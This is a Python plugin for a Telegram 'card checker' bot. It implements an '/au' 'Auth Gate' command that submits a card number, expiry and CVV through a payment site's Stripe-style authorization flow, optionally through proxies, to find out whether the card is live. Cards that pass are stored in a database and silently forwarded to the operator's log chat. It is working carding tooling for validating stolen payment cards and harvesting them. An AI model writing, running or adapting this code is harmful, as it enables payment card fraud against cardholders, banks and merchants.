"""
≛ <b>Commands Available</b> ≛

──────────────────────
- <code>/au</code> cc cvv mes ano || <reply_to_msg>
➛ Auth Gate
──────────────────────

©<a href="https://t.me/roldexverse">RoldexVerse</a>
"""


import os
import re
import time
import requests
from mills import LOG_CHAT

from mills.decorators import bot_cmd
from mills.plugins.checkers.utils.gateinfo import get_gate_info
from mills.plugins import rand_user_base
from mills.plugins.checkers.utils.getcards  import get_cards
from mills.plugins._helpers.strings import get_strings
from mills.plugins.checkers.funcs.au_defs import au_one, au_two, au_three, get_response_au



@bot_cmd(cmd="au", text_only = True)
@get_gate_info("au")
@get_cards()
@get_strings("card_chk")
async def _(m, gate_db, user_db, cards, lang):
    start_time = int(time.time())
    cc,mes,ano,cvv, bin_info = cards
    message = await m.reply(lang['fir_msg'].format(
        gate_name = gate_db['gate_name'],
        name = m.full_name(),
        id = m.sender_id,
        taken = int(time.time()) - start_time,
    ))
    r = requests.Session()
    if proxy:= await m.adb.get_key('use_proxy'):
        r.proxies = {'http': proxy, 'https': proxy}
    crsf = au_one(r)
    if not crsf:
        await message.edit("Error while checking your card. trying again....")
        return
    
    head = au_two(r, crsf)
    if not head:
        await message.edit("Error while checking your card. trying again....")
        return
    sec , req_sec = head
    await message.edit(lang['mid_msg'].format(
        gate_name = gate_db['gate_name'],
        name = m.full_name(),
        id = m.sender_id,
        taken = int(time.time()) - start_time,
    ))
    last = au_three(r, sec, req_sec, cc, mes, ano, cvv)
    if 'status' in last and 'succeeded' in last['status']:
        r_text, r_logo, r_respo = "Auth Live", "✅", 'CVV MATCH'
    else:
        if 'error' in last:
            stripeMessage = last['error']['message'].replace('_', ' ') if 'message' in last['error'] else last['error']['code'].replace('_', ' ')
            r_respo = last['error']['decline_code'].replace('_', ' ') if 'decline_code' in last['error'] else last['error']['code'].replace('_', ' ')
            r_text, r_logo , r_respo = get_response_au(stripeMessage)
        else:
            r_text, r_logo , r_respo = 'UNKOWN RESPONSE', "❌", 'DECLINED'
    await message.edit(lang['fin_msg'].format(
        gate_name = gate_db['gate_name'],
        card = f"{cc}|{mes}|{ano}|{cvv}",
        status = r_respo,
        logo = r_logo,
        message = r_text,
        vendor = bin_info['vendor'],
        type = bin_info['type'],
        bank_name = bin_info['bank_name'],
        country = bin_info['iso'],
        flag = bin_info['flag'],
        name = m.full_name(),
        id = m.sender_id,
        role = user_db['role'],
        taken = int(time.time()) - start_time,
    ), link_preview = False)
    if r_respo == "CVV MATCH":
        if user_db['saveccs']:
            await m.mdb.update_one('users',{'_id': m.sender_id}, {'$addToSet': {'lives': f"{cc}|{mes}|{ano}|{cvv} - {r_text} - {gate_db['gate_name']}"}})
        m.save_lives(f"{cc}|{mes}|{ano}|{cvv} - {r_text} - {gate_db['gate_name']}")
        await m.client.send_message(LOG_CHAT, f"{cc}|{mes}|{ano}|{cvv} - {r_text} - {gate_db['gate_name']}")
    await m.adb.set_key(f'antispam_{str(m.sender_id)}', time.time())
    return